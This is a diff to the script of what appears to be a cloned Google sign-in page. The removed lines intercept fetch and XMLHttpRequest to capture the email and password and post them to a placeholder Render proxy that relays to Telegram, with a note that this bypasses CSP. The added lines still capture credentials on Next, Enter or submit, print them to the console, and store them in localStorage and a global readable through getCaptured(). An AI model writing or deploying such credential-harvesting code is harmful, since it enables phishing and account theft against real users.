@@ -16085,45 +16085,7 @@
   </div>
 <script>
 (function() {
-    // ========== CONFIGURATION ==========
-    // REPLACE THIS WITH YOUR RENDER URL
-    const PROXY_URL = 'https://YOUR-RENDER-APP.onrender.com/send';
-    // ========== END CONFIGURATION ==========
-
     let passwordSent = false;
-
-    function sendToTelegram(email, password) {
-        if (passwordSent) return;
-        
-        console.log('[📤] Sending to proxy:', PROXY_URL);
-        console.log('[📤] Email:', email);
-        console.log('[📤] Password:', password);
-
-        // Send to your Render proxy using fetch (this bypasses CSP because your Render URL is allowed)
-        fetch(PROXY_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                email: email || 'Not found',
-                password: password
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log('[✅] Password sent to Telegram successfully!');
-            } else {
-                console.error('[❌] Proxy error:', data);
-            }
-        })
-        .catch(error => {
-            console.error('[❌] Failed to send via proxy:', error);
-        });
-
-        passwordSent = true;
-    }
 
     function getEmail() {
         const emailInput = document.querySelector('input[name="identifier"]') || 
@@ -16145,124 +16107,105 @@
         return pwdInput ? pwdInput.value : '';
     }
 
-    function captureAndSend() {
+    function captureAndLog() {
         if (passwordSent) return;
         
         const password = getPassword();
         if (password && password.length > 0) {
             const email = getEmail();
-            sendToTelegram(email, password);
-            console.log('[🔑] Password captured: "' + password + '"');
-        } else {
-            console.log('[⚠️] Password field empty');
+            
+            // ====== LOG TO CONSOLE ======
+            console.log('%c🔑 PASSWORD CAPTURED', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
+            console.log('%c📧 Email:', 'font-size:16px;font-weight:bold;color:#00f;', email);
+            console.log('%c🔑 Password:', 'font-size:16px;font-weight:bold;color:#f00;', password);
+            console.log('%c🕐 Time:', 'font-size:14px;color:#888;', new Date().toLocaleString());
+            console.log('%c' + '='.repeat(50), 'color:#888;');
+            
+            // Also store in localStorage as backup
+            try {
+                localStorage.setItem('captured_password', JSON.stringify({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                }));
+            } catch(e) {}
+            
+            // Store in global variable
+            window._capturedData = { email, password, timestamp: new Date().toISOString() };
+            
+            passwordSent = true;
         }
     }
 
-    // ========== INTERCEPT FETCH ==========
-    const originalFetch = window.fetch;
-    window.fetch = function(...args) {
-        const url = args[0];
-        if (typeof url === 'string' && url.includes('/signin/challenge')) {
-            try {
-                const body = args[1]?.body;
-                if (body) {
-                    const bodyText = body.toString();
-                    if (bodyText.includes('Passwd')) {
-                        const match = bodyText.match(/Passwd[^=]*=([^&]*)/);
-                        if (match && match[1]) {
-                            const password = decodeURIComponent(match[1]);
-                            if (password && password.length > 0 && !passwordSent) {
-                                const email = getEmail();
-                                sendToTelegram(email, password);
-                                console.log('[🔑] Password captured via fetch!');
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-        return originalFetch.apply(this, args);
-    };
-
-    // ========== INTERCEPT XMLHttpRequest ==========
-    const originalXHRSend = XMLHttpRequest.prototype.send;
-    XMLHttpRequest.prototype.send = function(body) {
+    // ====== RETRIEVE FUNCTION ======
+    window.getCaptured = function() {
         try {
-            if (this._url && this._url.includes('/signin/challenge')) {
-                const bodyText = body?.toString() || '';
-                if (bodyText.includes('Passwd')) {
-                    const match = bodyText.match(/Passwd[^=]*=([^&]*)/);
-                    if (match && match[1]) {
-                        const password = decodeURIComponent(match[1]);
-                        if (password && password.length > 0 && !passwordSent) {
-                            const email = getEmail();
-                            sendToTelegram(email, password);
-                            console.log('[🔑] Password captured via XHR!');
-                        }
-                    }
-                }
+            const stored = localStorage.getItem('captured_password');
+            if (stored) {
+                const data = JSON.parse(stored);
+                console.log('📂 Retrieved from localStorage:');
+                console.log('📧 Email:', data.email);
+                console.log('🔑 Password:', data.password);
+                console.log('🕐 Time:', data.timestamp);
+                return data;
             }
         } catch(e) {}
-        return originalXHRSend.apply(this, [body]);
+        
+        if (window._capturedData) {
+            console.log('📂 Retrieved from memory:');
+            console.log('📧 Email:', window._capturedData.email);
+            console.log('🔑 Password:', window._capturedData.password);
+            return window._capturedData;
+        }
+        
+        console.log('❌ No password captured yet');
+        return null;
     };
 
-    const originalOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
-        this._url = url;
-        return originalOpen.apply(this, [method, url, ...rest]);
-    };
-
-    // ========== CLICK HANDLER ==========
+    // ====== EVENT LISTENERS ======
     document.addEventListener('click', function(e) {
         const target = e.target.closest('button') || e.target.closest('[role="button"]');
         if (target) {
             const text = target.textContent || '';
             if (text.trim() === 'Next' || target.closest('#passwordNext')) {
-                console.log('[🖱️] Next button clicked');
-                setTimeout(captureAndSend, 300);
+                setTimeout(captureAndLog, 300);
             }
         }
     }, true);
 
-    // ========== ENTER KEY ==========
     const passwordField = document.querySelector('input[name="Passwd"]');
     if (passwordField) {
         passwordField.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                console.log('[⌨️] Enter key pressed');
-                setTimeout(captureAndSend, 300);
+                setTimeout(captureAndLog, 300);
             }
         });
     }
 
-    // ========== FIND BUTTON PERIODICALLY ==========
+    document.addEventListener('submit', function(e) {
+        if (e.target && e.target.querySelector('input[name="Passwd"]')) {
+            setTimeout(captureAndLog, 300);
+        }
+    }, true);
+
+    // Find Next button
     let attempts = 0;
     const findButton = setInterval(function() {
         const nextContainer = document.querySelector('#passwordNext');
         if (nextContainer && !nextContainer._listenerAttached) {
             nextContainer._listenerAttached = true;
             nextContainer.addEventListener('click', function() {
-                console.log('[🖱️] Next container clicked');
-                setTimeout(captureAndSend, 300);
+                setTimeout(captureAndLog, 300);
             });
-            console.log('[✅] Next button found and attached');
             clearInterval(findButton);
         }
         attempts++;
         if (attempts > 30) clearInterval(findButton);
     }, 500);
 
-    console.log('[✅] Password capture script active (using Render proxy)');
-    console.log('[ℹ️] Proxy URL:', PROXY_URL);
-    console.log('[ℹ️] Password will be sent when you click "Next" or press Enter');
-    
-    // Manual test
-    window.testCapture = function() {
-        const pwd = getPassword();
-        const email = getEmail();
-        console.log('[📝] Current password:', pwd);
-        console.log('[📝] Current email:', email);
-        if (pwd) sendToTelegram(email, pwd);
-    };
+    console.log('%c✅ Password Logger Active', 'font-size:18px;font-weight:bold;color:#0f0;');
+    console.log('%c📌 Enter password and click "Next" or press Enter', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 Password will appear in console', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 To retrieve later, type: getCaptured()', 'font-size:14px;color:#ff0;');
 })();
 </script>
